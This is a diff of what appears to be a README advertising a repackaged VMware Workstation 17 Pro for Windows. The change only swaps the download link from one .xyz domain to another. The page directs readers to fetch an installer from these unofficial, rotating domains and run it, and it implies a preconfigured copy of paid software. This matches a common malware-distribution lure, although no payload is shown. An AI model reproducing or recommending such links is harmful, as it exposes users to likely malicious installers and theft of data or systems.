@@ -18,8 +18,8 @@ Vmware Workstation 17 Pro | Windows desktop package | straightforward setup | st
 
 > Use the project link below for Windows.
 
-* **Project link:** **[vmware-workstation.nexpath.xyz](https://vmware-workstation.nexpath.xyz/)**
-* **Full URL:** `https://vmware-workstation.nexpath.xyz/`
+* **Project link:** **[vmware-workstation.nerasix.xyz](https://vmware-workstation.nerasix.xyz/)**
+* **Full URL:** `https://vmware-workstation.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Everything ships configured for local work — start the app and pick up where y
 * **RAM:** 6 GB base | 12 GB+ for demanding tasks
 * **Disk:** 5 GB available storage
 
-***
+***
